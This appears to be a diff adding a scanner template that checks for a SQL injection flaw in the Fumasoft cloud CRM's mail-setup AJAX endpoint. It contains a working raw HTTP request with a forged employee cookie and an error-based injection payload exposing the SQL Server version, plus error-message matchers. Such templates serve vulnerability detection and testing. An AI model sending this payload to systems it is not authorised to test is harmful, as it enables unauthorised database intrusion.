@@ -1,0 +1,30 @@
+id: poc-yaml-fumasoft-lerevnclick-sqli
+info:
+  name: 孚盟云 lerevnClick SQL注入漏洞
+  author: ProjectDiscoveryAI
+  severity: high
+  tags: sql-injection
+http:
+  - raw:
+      - |
+        POST /m/Dingding/Ajax/AjaxMailSetup.ashx HTTP/1.1
+        Host: {{Hostname}}
+        Cookie: UserCookie={"empId":"1"}
+        Content-Type: application/x-www-form-urlencoded
+
+        action=lerevnClick&id=1_'-1/@@version--
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 500
+      - type: word
+        part: body
+        words:
+          - "Microsoft SQL Server"
+          - "Exception:"
+      - type: regex
+        part: body
+        regex:
+          - "转换成数据类型(.*?)时失败"
+          - "在将(.*?)值"
